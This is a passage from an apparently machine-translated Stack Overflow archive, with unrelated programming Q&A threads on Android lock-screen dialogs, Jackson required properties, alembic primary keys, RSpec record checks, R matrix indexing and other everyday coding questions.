Dialog windows do not show on the lock screen because they are floating windows, I can't give you an actual reason as to why Android doesn't show them, but it might have to do with drawing the underlying lock screen components, since those are, for all intents and purposes "secure components".

Having dealt with your problem before, what I ended up doing was making a separate activity, setting your above window flags to the Activity's window using`Activity.getWindow().setFlags()` then showing my DialogFragment. It isn't pretty, but it seems like the closest thing that will *reliably* work when set up properly. Luckily UI-wise you can set the Activity's theme to be `Theme.Wallpaper.NoTitleBar` which looks pretty good.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2017-09-13T13:20:39.770

如果您使用对话框片段，则此代码有效。

```
@NonNull
@Override
public Dialog onCreateDialog(Bundle savedInstanceState) {
    Dialog dialog = super.onCreateDialog(savedInstanceState);
    dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
    dialog.requestWindowFeature(WindowManager.LayoutParams.SOFT_INPUT_STATE_VISIBLE);
    Window window = dialog.getWindow();

    window.addFlags(WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
            + WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
            + WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
            + WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
    return dialog;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-10-09T02:56:41.817

```
getWindow().addFlags(WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
| WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                        | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED);
        PowerManager powerMgr = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = powerMgr.newWakeLock(PowerManager.ACQUIRE_CAUSES_WAKEUP
                | PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ON_AFTER_RELEASE,
                "noti");
        KeyguardManager keyMgr = (KeyguardManager) getSystemService(KEYGUARD_SERVICE);
        keyLock = keyMgr.newKeyguardLock("noti");
keyLock.disableKeyguard();

wakeLock.acquire(); 
```

* * *

抱歉，代码格式错误。

# ios - 如何让我的屏幕仅在我的 iOS 应用程序中提示用户消息后才响应 UITouch？

> ID：13756531
> 
> 赞同：0
> 
> 时间：2012-12-07T03:37:18.770
> 
> 标签：ios, uitouch, touchesbegan, uievent

我需要使我的屏幕能够响应用户的触摸，但只有在通过 MBProgressHUD 显示的消息提示他们之后。我意识到我需要实施

```
-(void)touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event 
```

方法，但正如我所说，我只需要在用户收到消息提示时才需要这样做，而不是之前。可以做到这一点，如果可以，怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T04:06:05.757

只需使用名为 userHasRespondedToMessage 的布尔标志。在用户响应消息之前将其设置为 NO。然后，在您的 touches 方法中，如果布尔值为 no，则返回而不是处理触摸。或您想要启用或禁用tocuhes 的任何其他方式。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T04:45:59.030

这取决于你的情况。但是，这是处理触摸的一般方法。当您需要启用/禁用视图中的触摸时，您需要像这样启用/禁用它：

```
BOOL wantWhatTouch = NO.//or yes depend on you
[self.view setUserInteractionEnabled:wantWhatTouch]; 
```

上面的代码将禁用对您的视图的触摸。

所以，如果现在你想再次启用触摸。就在您删除/禁用提示消息时，只需再次启用它......说，您使用一个按钮来删除/隐藏您的警报，然后就这样做：

```
[self.view setUserInteractionEnabled:YES]; 
```

所以，你会发现你的触摸再次起作用。

# html - 如何在不解析的情况下从 nokogiri 返回文本

> ID：13756534
> 
> 赞同：2
> 
> 时间：2012-12-07T03:37:29.893
> 
> 标签：html, ruby, nokogiri

我有看起来像这样的html：

```
<textarea id='embed'>
   <iframe frameborder='0' width='728' height='450' src='http://somelink'>
   </iframe> some more text
</textarea> 
```

我的代码是：

`doc.at('textarea[@id="embed"]').content`

但是这会返回`some more text`

我想获取整个文本区域（包括`iframe`链接）。所以最后我想要这个：

```
<iframe frameborder='0' width='728' height='450' src='http://somelink'>
   </iframe> some more text 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-07T03:43:05.350

Use `.inner_html`.

```
[1] pry(main)> require 'nokogiri'
=> true
[2] pry(main)> noko = Nokogiri::HTML("<textarea id='embed'>
[2] pry(main)*    <iframe frameborder='0' width='728' height='450' src='http://www.dailymotion.com/embed/video/xvnu79'>
[2] pry(main)*    </iframe> some more text
[2] pry(main)* </textarea>");
[3] pry(main)> noko.css("#embed").inner_html
=> "<iframe frameborder=\"0\" width=\"728\" height=\"450\" src=\"http://www.dailymotion.com/embed/video/xvnu79\">\n   </iframe> some more text\n" 
```

Edit: you can use `.inner_html` with the XPath selector you have above too.

# python - 可以在生产中使用 django-scrapy 应用程序吗

> ID：13756537
> 
> 赞同：1
> 
> 时间：2012-12-07T03:37:58.337
> 
> 标签：python, django, scrapy

我有很多任务要通过生产服务器上的 scrapy 完成。由于我的经理想要添加或删除要报废的 URL，并且他想要 Web 界面。

我正在考虑为此制作网络应用程序

我找到了这个链接 [https://github.com/holgerd77/django-dynamic-scraper/](https://github.com/holgerd77/django-dynamic-scraper/)

我只是想知道我可以在生产中使用它还是可以在我的 django 应用程序中手动调用 scrapy 而我不需要使用该应用程序。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T02:17:28.770

我已经尝试过了，对我来说看起来还不错。他们在那里也有很好的[文档](http://django-dynamic-scraper.readthedocs.org/en/latest/)

如果您是新手并且想让事情顺利进行，它们会很好。但是我认为一旦您详细习惯了scrapy和django，您几乎就不需要它了

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T04:40:23.617

Python模块，包括scrapy，大部分时间都是即插即用的，所以是的，你应该能够用scrapy本身来做到这一点。您可能会受益于更清晰的文档。

# java - toString() 方法中的方法与字段名称

> ID：13756538
> 
> 赞同：0
> 
> 时间：2012-12-07T03:38:10.300
> 
> 标签：java, tostring

就在我认为我已经掌握了 Java 的基础知识时（已经整整一个学期了！），发生了一些事情让我对此产生了疑问。我正在做一些练习复习并且有一点问题。这是代码：

```
public class LetterCount 
{
    private char[] wordArray;
    private int numVowels = 0, numConsonants = 0, numSpaces = 0, numDigits = 0;

    public LetterCount(String str)
    {
        wordArray = str.toCharArray();
    }

    public int getNumVowels()
    {
        for (int count = 0; count < wordArray.length; count++)
        {
           if (wordArray[count] == 'a' || wordArray[count] == 'e' || 
               wordArray[count] == 'i' || wordArray[count] == 'o' || wordArray[count] 
               == 'u' || wordArray[count] == 'y')

           numVowels++;
        }
        return numVowels;
    }

    public int getNumDigits()
    {
        for (int count = 0; count < wordArray.length; count++)
        {
            if (Character.isDigit(wordArray[count]))
                numDigits++;
        }
        return numDigits;
    }

    public int getWhiteSpace()
    {
        for (int count = 0; count < wordArray.length; count++)
        {
            if (Character.isSpaceChar(wordArray[count]))
                numSpaces++;
        }

        return numSpaces;
    }

    public int getNumConsonants()
    {       
        numConsonants = wordArray.length - getNumVowels() - getNumDigits() - getWhiteSpace();

        return numConsonants;
    }

    public String toString()
    {
        String str = "Characters: " + wordArray.length + "\n" +
    "Vowels: " + getNumVowels() + "\n" +
                "Consonants: " + getNumConsonants() + "\n" +
                "Digits: " + getNumDigits() + "\n" +
                "Spaces: " + getWhiteSpace();

        return str;
    }
} 
```

这是输出：

```
Enter a sentence: this is a test 4 u
Characters: 18
Vowels: 5
Consonants: 2
Digits: 2
Spaces: 10 
```

我的问题： 1) 我确信我可以在 toString() 方法中使用字段名称（例如*numVowels*与*getNumConsonants()*），但似乎这个类需要我使用方法名称。当我使用字段名称时，我得到 0。为什么有区别？我知道如果我返回一个方程，我必须使用方法名称。

2) 我也不明白为什么我的 numConsonants() 方法没有返回正确的数字。如果我分别返回每个字段（并调用该方法，因为我无法调用字段名称），我会得到正确的数字。把它们放在一个等式中，这是不正确的。我究竟做错了什么？

这是原始的主要方法。我已经对其进行了编辑以调用 LetterCount 类中的方法：

```
 import java.util.Scanner;

public class LetterCountDemo {

    public static void main(String[] args) 
    {
        String sentence;
        LetterCount lc;
        Scanner keyboard = new Scanner(System.in);

        System.out.print("Enter a sentence: ");
        sentence = keyboard.nextLine();

        lc = new LetterCount(sentence);

        System.out.println(lc);
    }

} 
```

添加：

```
 lc.getNumVowels();
    lc.getNumConsonants(); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T03:43:59.713

You can use the 'field' (it's known as a 'member variable'), but in your case, it's initialized to zero, and only updated by the method.

So, if you never call the method, the member variable is never updated, so remains at zero.

Also, you don't 'call field names' - you can call a method, which may return a value. You can reference that value, and similarly you can reference a member variable.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-07T03:44:40.050

The answer to your first question is relatively simple. The fields are zero until the methods are called at least once. In other words, the fields are set in the methods so you have to call the methods first.

The answer to the second question is related. When you call `getNumVowels`, `getNumDigits`, or `getWhitespace` your are increasing the field values. If you initialize them to zero at the beginning, your approach will work.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-07T03:55:48.697

您必须使用方法而不是字段的原因很简单。您的方法不是简单的访问器方法。（检查[此链接](http://java.about.com/od/workingwithobjects/a/accessormutator.htm)）它们会进行一些计算并更新归档变量并返回它们。因此，在您调用该方法之前，您的字段的值为零。

这种更新字段变量的方式很糟糕。如果您两次调用该方法（例如：）`getNumVowels`，它将更新已更新的字段变量`numVowels`。

问题与`getNumConsonants`上述答案有关。

这里的解决方案是不使用字段变量并使用局部变量。请参见下面的示例。

```
public int getNumDigits()
{
    int numDigits = 0;
    for (int count = 0; count < wordArray.length; count++)
    {
        if (Character.isDigit(wordArray[count]))
            numDigits++;
    }
    return numDigits;
} 
```

使用此修改`getNumDigits()`将始终返回正确答案。

# java - 杰克逊 - 必需的财产？

> ID：13756540
> 
> 赞同：22
> 
> 时间：2012-12-07T03:38:25.747
> 
> 标签：java, json, annotations, jackson

我在对象映射器上使用 Jackson 的 readValue() 方法从 JSON 文件中读取并将其转换为我的 java 对象。

例如。

```
mapperObject.readValue( node, MyTargetClass.class ) 
```

我可以在 MyTargetClass 上设置任何注释来强制执行所需的属性吗？例如，如果我有一个带有属性 ABC、DEF 和 GHI 的 JSON 对象，而我的 Json 如下

```
{
  "ABC" : "somevalue"
  "DEF" : "someothervalue" 
} 
```

我希望它以某种方式失败，并且只有在 readValue 包含 ABC、DEF 和 GHI 时才能成功。

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2016-08-24T17:59:41.960

您可以使用注解将属性标记为需要，`@JsonProperty(required = true)`如果该属性丢失或为空，它将在反序列化过程中抛出 JsonMappingException。

编辑：我收到了对此的反对意见，没有发表评论。我很想知道为什么，因为它完全正确。

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2012-12-07T18:16:12.417

Jackson 不包括验证功能，这是设计使然（即被认为超出范围）。但通常使用的是[Bean Validation API](http://docs.oracle.com/javaee/6/tutorial/doc/gircz.html)实现。这样做的好处是数据格式处理和验证逻辑之间的解耦。这就是 DropWizard 之类的框架所使用的；这是 JAX-RS（如 Jersey）为 JAX-RS 2.0 开发的方向。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2019-07-02T14:17:19.493

如果要确保提供了 json 字段，则必须使用`@JsonProperty(value = "fieldName", required = true)`注解作为构造函数的参数。但这还不够，构造函数也应该有`@JsonCreator`注释。

例如，如果您有一个名为 ' `endPoint`' 的字段，并且您希望确保它在 JSON 文件中提供，那么如果未提供，以下代码将引发异常。

```
@JsonCreator
public QuerySettings(@JsonProperty(value = "endPoint", required = true) String endPoint) {
        this.endPoint = endPoint;
} 
```

我发现[此链接](https://www.novixys.com/blog/jackson-annotations-guide/)有助于理解 Jackson 注释。它也很好地解释了为什么 required=true 是不够的，而且它的名字有悖于直觉。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-09-23T08:47:33.270

如果您对使用它既不满意也不满意，`@JsonProperty(required = true)`因为它仅适用于`@JsonCreator`bean验证或使用bean验证，那么解决它的另一种方法是在相关变量的setter方法中捕获它。

您可以在设置变量之前简单地检查变量是否为空并抛出`IllegalArgumentException`或`NullPointerException`（少数人喜欢）

注意：这也取决于您的 POJO 是如何定义的，因此请确保它正在使用 setter 方法路由以使该解决方案起作用。

# vba - 计算月数的第一天

> ID：13756545
> 
> 赞同：1
> 
> 时间：2012-12-07T03:39:01.583
> 
> 标签：vba, ms-access

我遇到了一个需要更多指导的问题。我有一个表格，允许用户输入开始日期和结束日期来表示合同的长度。我正在使用以下查询来计算每月金额：

```
SELECT t_Actuals.InvoiceAmount,
 (DateDiff("m",[StartDate],[EndDate])+1) AS [Contract Term],
 CCur(Round(([InvoiceAmount]/[Contract Term]),0)) AS MonthlyAmount
 FROM t_Actuals; 
```

我们的副总裁想要在整个合同期限（即从开始日期起 11 个月）内预测的 MonthlyAmount。理想情况下，我想在整个合同期限内以 MM-YYYY (01/2012, 02,2012) 格式分配 MonthlyAmount，但不可否认，我在 Access 之外的日期处理方面经验不足查询网格。

无论如何，我一直在阅读有关 DateSerial 函数以查找该月的第一天，但​​是您将如何将其实现为循环以查找接下来 36 个月该月的第一个日期的值并将该日期写入预计日期为 fldDate 和 MonthlyAmount 的表。

对不起，这是一个令人费解的问题。任何建议将不胜感激。提前感谢您的任何指导。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T04:13:57.033

"*一个循环来查找接下来 36 个月的每月第一个日期的值，并将该日期写入表中，预计日期为 fldDate 和 MonthlyAmount* "

给定第一个月的开始日期和月数，您可以使用该`DateAdd()`函数来确定您需要插入的其余日期。作为 DAO 记录集打开您的表，使用其`.AddNew`方法添加一行，在字段中分配所需的值，然后调用`.Update`以存储该行。

听起来你的挑战是日期片，所以我把它画了出来，然后`MonthlyAmount`让你完成。

```
Public Sub LoadMonthStartDates(ByVal pFirstDate As Date, _
        ByVal pMonths As Long)
    Const cstrTable = "YourTableNameHere"
    Dim db As DAO.database
    Dim rs As DAO.Recordset
    Dim i As Long

    Set db = CurrentDb
    Set rs = db.OpenRecordset(cstrTable, dbOpenTable, dbAppendOnly)
    For i = 1 To pMonths
        rs.AddNew
        rs!fldDate = DateAdd("m", i - 1, pFirstDate)
        'rs!MonthlyAmount = <your calculated amount>
        rs.Update
    Next
    rs.Close
    Set rs = Nothing
    Set db = Nothing
End Sub 
```

# matlab - 求测试数据的分类率

> ID：13756551
> 
> 赞同：1
> 
> 时间：2012-12-07T03:39:43.267
> 
> 标签：matlab, for-loop, knn

我需要使用[KNN搜索](http://www.mathworks.com/help/stats/classification-using-nearest-neighbors.html#btap7k2)对测试数据进行分类并找到分类率。

下面是matlab代码：例如：

```
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
    load fisheriris
    x = meas(:,3:4); % x =all training data

    y = [5 1.45;6 2;2.75 .75]; % y =3 testing data 

    [n,d] = knnsearch(x,y,'k',10);   % find the 10 nearest neighbors to three testing data

    for b=1:3
    tabulate(species(n(b,:)))
    end
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% 
```

结果显示在命令窗口中：

```
tabulate(species(n(1,:)))
       Value    Count   Percent
   virginica        2     20.00%
  versicolor        8     80.00%

tabulate(species(n(2,:)))
      Value    Count   Percent
  virginica       10    100.00%

tabulate(species(n(3,:)))
       Value    Count   Percent
  versicolor        7     70.00%
      setosa        3     30.00% 
```

如果测试点是'Versicolor'，则第一个和第三个测试点的结果分类正确，第二个测试点的结果是错误的，所以分类率为2/3 x100%=66.7%。

是否有任何想法修改matlab代码以自动找到分类率并将结果保存到工作区中？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T13:37:43.063

通常，您可以使用以下方法找到正确预测的数量

```
sum(predicted_class == true_class)        % For numerical data
sum(strcmp(predicted_class, true_class))  % For cellstrings 
```

或百分比

```
100 * sum(predicted_class == true_class) / length(predicted_class) 
```

在`fisheriris`真正的类的情况下是`species`. 对于您构建的数据，它将是

```
true_classes = [cellstr('versicolor'); cellstr('versicolor'); cellstr('versicolor')] 
```

在最近邻的情况下，真正的类将是最近邻的类。对于单个邻居：

```
 predicted_class = species(n) 
```

`n`找到的最近邻居的索引在哪里`[n, d] = knnsearch(x, y)`。

```
sum(strcmp(predicted_class, true_class))
% result: 1 
```

当您只使用一个邻居时，这确实是正确的。

# internet-explorer-7 - IE7中的CKEditor

> ID：13756557
> 
> 赞同：0
> 
> 时间：2012-12-07T03:40:39.500
> 
> 标签：internet-explorer-7, ckeditor

在使用 CKEditor 最新版本时可用。在 Chrome 和 Firefox 中，它可以正常工作。但在 IE7 中，我遇到了一些显示问题。

当我单击图像按钮时，背景变为黑色，底部的 p 看起来与 Chrome 中显示的不一样我也收到 JavaScript 错误 undefined is null or not an object

请帮忙

![在此处输入图像描述](../Images/0c28634b06800b83b51ae311661b40ac.png) ![在此处输入图像描述](../Images/2d34b7a508ac7efa88d797085fb739c8.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T08:31:47.967

您确定您的页面没有在 Quirks 模式下运行（来源正确）吗？我没有看到这个问题，例如[http://ckeditor.com/demo](http://ckeditor.com/demo)。

CKEditor 4.0 不支持 Quirks 模式——我们现在正在努力。

# jquery-mobile - 如何使用主干动态导入css？

> ID：13756560
> 
> 赞同：3
> 
> 时间：2012-12-07T03:41:41.870
> 
> 标签：jquery-mobile, backbone.js, underscore.js

我正在开发一个应用程序，使用主干、下划线和 jquerymobile。按照 jqmobile 的方式，我有一个索引页面，它在特殊`div`的 s 标记中加载每个访问过的页面，并用属性标记`data-role="page"`。对于每个页面，我都有其相应的样式文件（或嵌入在`style`html 标记中的代码片段）。我的问题是我的*可样式化*内容的名称开始发生冲突。另一件事是我不希望为每个页面加载不必要的样式文件。有什么方法可以只动态导入当前页面所需的 css 吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-08T03:05:35.263

我正在使用[RequireJS](http://requirejs.org/)和[RequireCSS](https://github.com/VIISON/RequireCSS)插件完成你所要求的。

这是我的一个观点的片段：

```
define([
  'jquery',
  'underscore',
  'backbone',
  'views/company/form',
  'text!templates/company/company.html',
  'css!../../../css/company/company',
], function($, _, Backbone, Form, pageTemplate) {

  var Page = Backbone.View.extend({
    ...
  });

  return Page;

}); 
```

第 7 行，`'css!../../../css/company/company'`是 css 文件成为加载此视图的要求的地方。

加载样式表后，`company.css`即使加载其他“页面”，它也会在浏览器中，因为没有实际的页面刷新。因此，我的主页视图在`<html>`元素上切换了一个类：

```
// remove any old route-* classes existing on the html element
$('html').removeClassRegEx(/^route-.*/);
// add in the company's top-level class name
$('html').addClass('route-company'); 
```

并且我的所有页面特定样式`company`都限定在`.route-company`该类范围内。

你可以在[这里找到 jQuery 插件 removeClassRegEx](http://www.websanova.com/tutorials/jquery/jquery-remove-class-by-regular-expression)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T04:47:40.040

一种方法是使用**jquery**（你 90% 已经在使用骨干网），以及它的`load`或`get`ajax 函数，或其他任何东西，加上回调。

然后，如果需要，您可以从骨干应用程序中调用此类函数，并将`<style>`标签内的 css 作为模板注入到您的文档中。

或者我认为还有专门的 jquery 函数。

我能想到的另一种方法是使用**require.js**和它的插件（`text`我相信它有插件，它也可以让你加载你的 javascript 模板）。

# python - 在alembic中向现有MySQL表添加主键

> ID：13756567
> 
> 赞同：10
> 
> 时间：2012-12-07T03:42:40.027
> 
> 标签：python, sqlalchemy, alembic

我正在尝试使用 alembic 将“id”主键列添加到已经存在的 MySQL 表中。我尝试了以下...

```
op.add_column('mytable', sa.Column('id', sa.Integer(), nullable=False))
op.alter_column('mytable', 'id', autoincrement=True, existing_type=sa.Integer(), existing_server_default=False, existing_nullable=False) 
```

但出现以下错误

```
sqlalchemy.exc.OperationalError: (OperationalError) (1075, 'Incorrect table definition; there can be only one auto column and it must be defined as a key') 'ALTER TABLE mytable CHANGE id id INTEGER NOT NULL AUTO_INCREMENT' () 
```

看起来alembic生成的sql语句没有`PRIMARY KEY`在alter语句的末尾添加。我可能错过了一些设置吗？

提前致谢！

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2012-12-07T06:02:51.037

我花了一些时间研究 alembic 源代码，这似乎不受支持。*您可以在创建*表时指定主键，但不能在添加列时指定。事实上，它专门检查并且不会让你（[链接到源](https://github.com/sqlalchemy/alembic/blob/ec8db7d875f486cde2d02942bd8409abf37e3704/alembic/operations/toimpl.py#L134-L136)）：

```
# from alembic.operations.toimpl.add_column, line 132
for constraint in t.constraints:
    if not isinstance(constraint, sa_schema.PrimaryKeyConstraint):
        operations.impl.add_constraint(constraint) 
```

我环顾四周，将主键添加到现有表可能会导致未指定的行为 - 主键不应该为空，因此您的引擎可能会也可能不会为现有行创建主键。有关更多信息，请参阅此 SO 讨论： [将自动增量主键插入现有表](https://stackoverflow.com/questions/9070764/insert-auto-increment-primary-key-to-existing-mysql-database)

我只是直接运行 alter 查询，如果需要，创建主键。

```
op.execute("ALTER TABLE mytable ADD id INT PRIMARY KEY AUTO_INCREMENT;") 
```

如果您确实需要跨引擎兼容性，那么大锤将是（1）创建一个与旧表相同且具有主键的新表，（2）迁移所有数据，（3）删除旧表和（4 ) 重命名新表。

希望有帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-08-10T12:51:35.570

您必须删除表中的主键，然后创建一个包含您希望作为主键的所有列的新主键。

例如。在 psql 中使用`\d <table name>`定义模式，然后检查主键约束。

```
Indexes:
"enrollments_pkey" PRIMARY KEY, btree (se_crs_id, se_std_id) 
```

然后在 alembic 中使用此信息

```
def upgrade():
# ### commands auto generated by Alembic - please adjust! ###
op.add_column('enrollments', sa.Column(
    'se_semester', sa.String(length=30), nullable=False))
op.drop_constraint('enrollments_pkey', 'enrollments', type_='primary')
op.create_primary_key('enrollments_pkey', 'enrollments', [
                      'se_std_id', 'se_crs_id', 'se_semester']) 
```

运行后的结果`\d enrollments`应该更新为

```
Indexes:
"enrollments_pkey" PRIMARY KEY, btree (se_std_id, se_crs_id, se_semester) 
```

这个解决方案对我来说很好。

# google-bigquery - 如何计算重复字段中的搭配

> ID：13756568
> 
> 赞同：0
> 
> 时间：2012-12-07T03:42:58.787
> 
> 标签：google-bigquery

我有一个包含字符串列表的重复字段 A。什么是找到与给定字符串一致的 TOP 字符串的好方法。因此，如果 A 持有主题标签，对于给定的主题标签 #T1，找到与 #T1 一致的标签在最多的记录数中。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T21:02:04.940

您可以使用`WITHIN`和`SUM(IF(...))`来查找匹配项。例如：

```
SELECT hashtag, COUNT(*) AS cnt
    (SELECT tweet.hashtag as hashtag, 
            SUM(IF(tweet.hashtag == '#T1', 1, 0)) WITHIN RECORD as tagz
     FROM [tweets]) 
WHERE tagz  > 0
GROUP by hashtag,
ORDER BY cnt DESC 
```

# ruby - How to elegantly check for existence of a record in RSpec

> ID：13756569
> 
> 赞同：37
> 
> 时间：2012-12-07T03:43:00.310
> 
> 标签：ruby, rspec

Is there a better way to check for the existence of a record in RSpec?

```
Foo.where(bar: 1, baz:2).count.should == 1 
```

* * *

## 回答 #1

> 赞同：41
> 
> 时间：2013-06-17T16:11:14.483

使用[Rspec 2.13.0](http://rubydoc.info/gems/rspec-expectations/RSpec/Matchers%3aexist)，我能够做到

```
Foo.where(bar: 1, baz: 2).should exist 
```

* * *

**编辑：**

Rspec 现在有[一个期望语法](http://myronmars.to/n/dev-blog/2012/06/rspecs-new-expectation-syntax)：

```
expect(Foo.where(bar: 1, bax: 2)).to exist 
```

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2015-09-16T13:24:14.097

对于 rspec-rails > 3.0

拥有博客模型，

```
describe 'POST #create' do
  it 'creates a post' do
    post :create, blog: { title: 'blog title' }

    # Returns true if the post was successfully added
    expect(Blog.where(title: 'blog title')).to be_present
  end
end 
```

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2013-11-12T04:51:44.167

使用期望语法：

```
expect(Foo.where(bar: 1, baz: 2)).not_to be_empty
expect(Foo.where(bar: 1, baz: 2)).to exist 
```

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2012-12-07T03:56:38.867

利用`Foo.exists?(bar: 1, baz: 2).should be_true`

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2012-12-07T03:45:16.437

```
Foo.where(bar: 1, baz: 2).exists?.should be_true 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2021-04-21T22:48:21.130

```
RSpec.describe Foo do
  let(:foo_attributes) { { bar: 1, baz: 2 } }
  before { FactoryBot.create(:foo, **foo_attributes) }
  subject { Foo.where foo_attributes }

  it { is_expected.to exist }
end 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2020-10-13T20:26:13.383

它对我有用：

```
expect(Foo.where(bar: 1, baz:2)).not_to be nil 
```

# r - 抓取下三角形内的三角形

> ID：13756570
> 
> 赞同：7
> 
> 时间：2012-12-07T03:43:02.007
> 
> 标签：r

我需要抓住构成对称矩阵下三角形的所有三个元素三角形。我想不出如何按照最左边的列向下，然后是右边的下一列的顺序来抓取所有这些碎片，依此类推。我知道下三角形内的 numbe rof 迷你三角形是：

```
n = x(x - 1)/2
where: x = nrow(mats[[i]]) 
```

在这里，我创建了三个带有字母的矩阵（我更容易用这种方式概念化）和我正在寻找的顺序中的元素：

```
FUN <- function(n) {
    matrix(LETTERS[1:(n*n)], n)
}

mats <- lapply(3:5, FUN) 
```

所以这是我想为上面创建的每个矩阵得到的输出（我把它放在代码而不是输出格式中）：

```
list(c("B", "C", "F"))

list(c("B", "C", "G"), c("C", "D", "H"), c("G", "H", "L"))

list(c("B", "C", "H"), c("C", "D", "I"), c("D", "E", "J"), 
    c("H", "I", "N"), c("I", "J", "O"), c("N", "O", "T")) 
```

我怎样才能在基地 R 中以最快的方式完成这项任务？

不确定我所追求的这种视觉效果是否有帮助，但它可能是：

![在此处输入图像描述](../Images/169862f16097134a58e8ff11fae7478a.png)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-07T04:35:57.143

好问题！以下是如何使用一些递归来解决它（后面是一个更简单的版本）

```
triangle <- function(base.idx, mat) {
    upper.idx <- base.idx - 1L
    right.idx <- base.idx + nrow(mat)
    paste(mat[c(upper.idx, base.idx, right.idx)], collapse = " ")
}

get.triangles <- function(mat) {
    N <- nrow(mat)
    if (N == 3L) {
        return(triangle(3L, mat))
    } else {
        left.idx  <- 3:N
        right.mat <- mat[2:N, 2:N]
        left.triangles  <- sapply(left.idx, triangle, mat)
        right.triangles <- Recall(right.mat) 
        return(c(left.triangles, right.triangles))
    }
}

x <- lapply(mats, get.triangles)

# [[1]]
# [1] "B C F"
# 
# [[2]]
# [1] "B C G" "C D H" "G H L"
# 
# [[3]]
# [1] "B C H" "C D I" "D E J" "H I N" "I J O" "N O T" 
```

我只会评论输出不完全符合您的要求。这是因为创建返回平面列表的递归函数总是很难使用：不知何故，你总是以嵌套列表结束......

所以最后一步应该是：

```
lapply(x, strsplit, split = " ") 
```

它将采用您要求的相同格式。

* * *

这是一个更简单的版本（忘记递归！）

```
get.triangles <- function(mat) {
    base.idx  <- seq_along(mat)[row(mat) > col(mat) + 1]
    upper.idx <- base.idx - 1L
    right.idx <- base.idx + nrow(mat)

    lapply(mapply(c, upper.idx, base.idx, right.idx, SIMPLIFY = FALSE),
           function(i)mat[i])
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-07T05:08:36.917

编辑添加一个`SIMPLIFY=FALSE`现在给出你想要的东西：

基本上，此方法获取所需三角形的所有左上角的索引，然后抓取 [cell below] + [cell below + to the right]。刺激。这种方法的另一个好处是它适用于`matrix`和`data.frame`对象。

```
bot.tris <- function(data) {
  idx1 <- unlist(sapply((nrow(data)-2):1,function(x) tail(2:(nrow(data)-1),x)))
  idx2 <- rep(1:(nrow(data)-2),(nrow(data)-2):1)
  mapply(function(x,y) {c(data[x,y],data[x+1,y],data[x+1,y+1])},idx1,idx2,SIMPLIFY=FALSE)
} 
```

结果：

```
> result <- lapply(mats,bot.tris)
> str(result)
List of 3
 $ :List of 1
  ..$ : chr [1:3] "B" "C" "F"
 $ :List of 3
  ..$ : chr [1:3] "B" "C" "G"
  ..$ : chr [1:3] "C" "D" "H"
  ..$ : chr [1:3] "G" "H" "L"
 $ :List of 6
  ..$ : chr [1:3] "B" "C" "H"
  ..$ : chr [1:3] "C" "D" "I"
  ..$ : chr [1:3] "D" "E" "J"
  ..$ : chr [1:3] "H" "I" "N"
  ..$ : chr [1:3] "I" "J" "O"
  ..$ : chr [1:3] "N" "O" "T" 
```

# scala - 对组合类型使用隐式 def

> ID：13756572
> 
> 赞同：0
> 
> 时间：2012-12-07T03:43:17.073
> 
> 标签：scala, types, implicit-conversion

如果这个问题是重复的，请原谅我；我找不到任何东西，因为我不知道要搜索的正确单词。因此，使用隐式 def，我可以执行以下操作：

```
type CharsetMap = Map[Charset, Byte]

implicit def seqtup2CharsetMap(input: Seq[(String, Int)]): CharsetMap = {
  Map.empty  // placeholder
}

def somef(a: Int, b:Int, p: CharsetMap) = p
somef(1, 3, Seq(("hey", 2), ("there", 9))) 
```

这让我可以`somef`使用 Seq[(String, Int)] 对象作为参数进行调用。问题是我有这样的东西......

```
def somef2(p: (CharsetMap) => Int) = p 
```

这不起作用：

```
val p = (a: Seq[(String, Int)]) => 19
somef2(p) 
```

我怎么能做到这一点而不做一个`implicit def`专门的`(Seq[(String, Int)]) => Int`？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T04:29:25.717

看起来您想将某个函数隐式转换`A => B`为从`C => B`. 你可以用这个通用的隐式来做到这一点：

```
implicit def f2InputConverter[A, B, C](f: A => B)(implicit i: C => A): C => B = (c: C) => f(i(c)) 
```

